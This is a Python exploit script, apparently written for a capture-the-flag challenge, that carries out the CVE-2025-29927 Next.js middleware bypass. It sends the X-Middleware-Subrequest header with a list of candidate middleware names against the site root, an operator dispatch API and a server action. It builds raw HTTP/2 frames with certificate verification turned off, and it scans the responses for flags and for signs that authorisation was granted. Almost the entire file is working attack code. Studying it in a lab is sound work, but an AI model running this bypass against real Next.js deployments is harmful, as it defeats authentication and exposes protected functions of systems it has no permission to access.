#!/usr/bin/env python3
"""
probe43: CVE-2025-29927 — Next.js middleware bypass via X-Middleware-Subrequest.

If a middleware authenticates the request and sets state for the action
to consume, we can disable it by sending X-Middleware-Subrequest with the
middleware path.
"""
import socket
import ssl
import struct
import time
import re
import json
import hashlib
from hpack import Encoder, Decoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443

with open("/tmp/funi.actionid") as f:
    ACTION_ID = f.read().strip()
print(f"# action_id = {ACTION_ID}")

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def open_h2():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(PREFACE)
    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
    return sock


def call_action(body_bytes, content_type="text/plain;charset=UTF-8", extra_headers=None):
    sid = 1
    enc = Encoder()
    headers = [
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", content_type),
        ("content-length", str(len(body_bytes))),
        ("trailer", "next-action"),
        ("user-agent", "p43"),
    ]
    if extra_headers:
        for k, v in extra_headers:
            headers.append((k, v))
    head_block = enc.encode(headers)
    trailer_block = enc.encode([("next-action", ACTION_ID)])

    sock = open_h2()
    sock.settimeout(2)
    try:
        sock.recv(65536)
    except Exception:
        pass
    sock.settimeout(15)
    raw = struct.pack(">I", len(head_block))[1:] + b"\x01" + bytes([0x04]) + struct.pack(">I", sid) + head_block
    sock.sendall(raw)
    raw = struct.pack(">I", len(body_bytes))[1:] + b"\x00" + bytes([0x00]) + struct.pack(">I", sid) + body_bytes
    sock.sendall(raw)
    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + bytes([0x05]) + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    sock.settimeout(15)
    buf = b""
    deadline = time.time() + 15
    while time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        buf += chunk
    sock.close()

    body = b""
    pos = 0
    dec = Decoder()
    status = None
    out_headers = []
    while pos < len(buf):
        if len(buf) - pos < 9:
            break
        length = int.from_bytes(buf[pos:pos+3], "big")
        ftype = buf[pos+3]
        flags = buf[pos+4]
        sid_ = int.from_bytes(buf[pos+5:pos+9], "big") & 0x7fffffff
        payload = buf[pos+9:pos+9+length]
        pos += 9 + length
        if ftype == 1:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            if flags & 0x20:
                data = data[5:]
            try:
                hdrs = dec.decode(data)
                out_headers.extend(hdrs)
                for k, v in hdrs:
                    sk = k.decode() if isinstance(k, bytes) else k
                    sv = v.decode() if isinstance(v, bytes) else v
                    if sk == ":status":
                        status = sv
            except Exception:
                pass
        elif ftype == 0:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            body += data
    return status, out_headers, body


def extract_row1(body):
    text = body.decode("utf-8", "replace")
    m = re.search(r'^1:(\{.*?\})$', text, re.MULTILINE)
    if m:
        try:
            return json.loads(m.group(1))
        except Exception:
            return m.group(1)
    return None


import urllib.request
import urllib.error
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def call_dispatch(extra_headers=None):
    url = f"https://{HOST}/api/operator/dispatch"
    body = '{"operation":"plc-sync","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"ОП-3 / верхняя станция"}'.encode()
    headers = {"Content-Type": "application/json", "User-Agent": "p43"}
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=15) as resp:
            return resp.status, dict(resp.headers), resp.read(), time.time() - t0
    except urllib.error.HTTPError as e:
        try:
            d = e.read()
        except Exception:
            d = b""
        return e.code, dict(e.headers), d, time.time() - t0


def call_get_root(extra_headers=None):
    url = f"https://{HOST}/"
    headers = {"User-Agent": "p43"}
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=15) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        try:
            d = e.read()
        except Exception:
            d = b""
        return e.code, dict(e.headers), d


# CVE-2025-29927 — known middleware names to try
MIDDLEWARE_NAMES = [
    "middleware",
    "src/middleware",
    "src/middleware:middleware",
    "src/middleware:middleware:middleware",
    "src/middleware:middleware:middleware:middleware",
    "src/middleware:middleware:middleware:middleware:middleware",
    "src/middleware:middleware:middleware:middleware:middleware:middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "next-middleware",
    "auth",
    "src/auth",
    "src/lib/middleware",
    "lib/middleware",
    "_middleware",
]

# 1. baseline: GET /
print("\n## Step 1: GET / baseline")
st, h, body = call_get_root()
base_sha = hashlib.sha256(body).hexdigest()[:16]
print(f"  st={st} sha={base_sha} len={len(body)} headers={ {k:v for k,v in h.items() if 'middleware' in k.lower() or 'auth' in k.lower() or 'next' in k.lower()} }")

print("\n## Step 2: GET / with x-middleware-subrequest")
for mw in MIDDLEWARE_NAMES:
    st, h, body = call_get_root({"x-middleware-subrequest": mw})
    sha = hashlib.sha256(body).hexdigest()[:16]
    diff = " [DIFF]" if sha != base_sha else ""
    print(f"  mw={mw:60s} st={st} sha={sha} len={len(body)}{diff}")
    if diff:
        # Find any embed differences
        for kw in [b"alfa{", b"flag", b"restored\":true", b"recovery", b"authorized"]:
            idx = body.find(kw)
            if idx >= 0:
                print(f"    contains {kw!r} at {idx}: {body[max(0,idx-50):idx+150]!r}")

print("\n## Step 3: dispatch with x-middleware-subrequest")
for mw in MIDDLEWARE_NAMES:
    st, h, body, dt = call_dispatch({"x-middleware-subrequest": mw})
    print(f"  mw={mw:60s} dispatch st={st} dt={dt:.2f}s body={body[:80]!r}")
    if st != 502 or b"recovery" not in body:
        print(f"    !! Different response: {body[:200]!r}")
    time.sleep(0.3)

print("\n## Step 4: action with x-middleware-subrequest")
for mw in MIDDLEWARE_NAMES:
    st, h, body = call_action(b'["$K1"]', extra_headers=[("x-middleware-subrequest", mw)])
    row1 = extract_row1(body)
    err = row1.get("error") if isinstance(row1, dict) else None
    msg = (row1.get("message", "") if isinstance(row1, dict) else "")[:50] if row1 else ""
    print(f"  mw={mw:60s} action st={st} err={err} msg={msg!r}")
    if row1 and isinstance(row1, dict) and (err != "recovery-offline" or row1.get("ok")):
        print(f"    !!!!! UNUSUAL row1: {row1}")
    time.sleep(0.3)

print("\n# done.")
